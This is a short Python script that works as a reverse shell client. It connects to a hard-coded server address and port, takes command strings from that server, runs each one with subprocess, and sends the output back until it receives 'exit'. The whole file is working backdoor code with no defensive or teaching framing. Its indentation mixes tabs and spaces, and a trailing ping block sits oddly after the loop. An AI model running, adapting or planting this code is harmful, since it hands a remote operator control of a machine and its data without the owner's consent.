#!/usr/bin/python

import subprocess
import socket
import sys
import os

#details of the server
PORT = 4567
IP = '10.42.0.1'


def do(args):
        p = subprocess.Popen(args.split(), stdout=subprocess.PIPE)
        output, err = p.communicate()
        #print(output)
        return output


# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = (IP, PORT)
sock.connect(server_address)
print('Connected, waiting for commands on port:' + str(PORT))

try:
    while True:
	#sock.send(socket.gethostname() + 'connected')
	command = sock.recv(1024)
	if command == 'exit':
	    break
	print('command received:' + command)
	result = do(command)
	print(result)
        sock.send(result)

finally:
    print('closing socket')
    sock.close()


if __name__=='__main__':
	do("ping -c 10 www.cyberciti.biz")
